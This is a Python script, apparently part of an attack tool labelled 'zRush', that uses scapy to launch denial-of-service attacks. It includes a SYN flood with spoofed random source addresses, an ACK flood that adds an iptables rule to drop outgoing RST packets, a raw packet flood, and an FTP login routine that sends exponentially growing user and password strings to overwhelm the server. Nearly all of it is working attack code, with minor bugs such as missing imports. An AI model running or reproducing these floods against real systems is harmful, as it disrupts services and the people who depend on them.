from scapy.all import*
import os
import time
from ftplib import FTP
from threading import Thread
import socket

def syn_flood(src, dst, dport):
    print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    srcIP = RandIP("192.168.1.1/24")
    srcPort = RandShort()
    ip = IP(src = srcIP, dst = dst)
    tcp = TCP(sport = srcPort, dport = dport, flags = "S")
    raw = Raw(b"X"*1024)
    SYN = ip/ tcp/ raw
    print("[*] sending SYN packets...\n")
    i = 1
    try:
        start_time = time.time()
        while(True):
            send(SYN, loop = 0, verbose = 0)
            print(str(i), "SYN packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "SYN packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")


def ACK_attack(src, dst, dport):
    print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
    os.system(cmd)
    i = 1
    print("[*] sending ACK packets after receiving SYN/ACK from target...")
    try:
        start_time = time.time()
        while(True):
            #syn
            sport = random.randint(1024, 65535)
            ip = IP(src = src, dst = dst)
            SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
            SYNACK=sr1(ip/SYN, verbose = 0)

            #ack
            ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
            send(ip/ACK, verbose = 0)
            print(str(i), "ACK packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "ACK packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")
        os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

def lpacket_raw(src, dst, dport, i):
    #syn
    sport = random.randint(1024, 65535)
    ip = IP(src = src, dst = dst)
    SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
    SYNACK=sr1(ip/SYN, verbose = 0)

    #ack
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    ftpresponse = sr1(ip/ACK, verbose = 0)
    print(str(i), "ACK packets sent.", end = "\r")

    raw = Raw(b"X"*1024)
    i = ftpresponse.seq
    while(True):
        TCP_layer = TCP(sport = sport, dport = dport, seq = i, ack = i + 1, flags = 'A')
        i += 1
        packet = ip/TCP_layer/raw
        send(packet, verbose = 0)
        break
    """
    s = TCP_client.tcplink(Raw, dst, dport)
    print("sending")
    while(True):
        #s.send((bytes(("x"*1024).strip(), encoding = 'utf-8')))
        s.send((bytes(("x"*1024), encoding = 'utf-8')))
    """
#send long credentials (ID) when FTP server asks for auth
def lpacket(src, dst, dport, i):
    processThread = threading.Thread(target = lpackethandler, args = (src, dst, dport, i,))
    processThread.start()


def lpackethandler(src, dst, dport, i):
    i = int(i)

    print("Depth", i)
    ftp = FTP(dst)
    print("Attempting to log in...")
    ftp.login(user = ("X"*(2**i)).strip(), passwd = ("X"*(2**i)).strip())
    ftp.retrlines('LIST')

    """
    try:
        print("depth", i)
        ftp = FTP(dst)
        print("X"*(2**i))
        print("logging in")
        ftp.login(user = ("X"*(2**i)).strip(), passwd = ("X"*(2**i)).strip())
        ftp.retrlines('LIST')
    except:
        print("ftp returned error. Try with bigger string? (y/n)")
        ret = input("zRush > ")
        if ret == "y":
            lpacket(src,dst,dport,i+1)
            """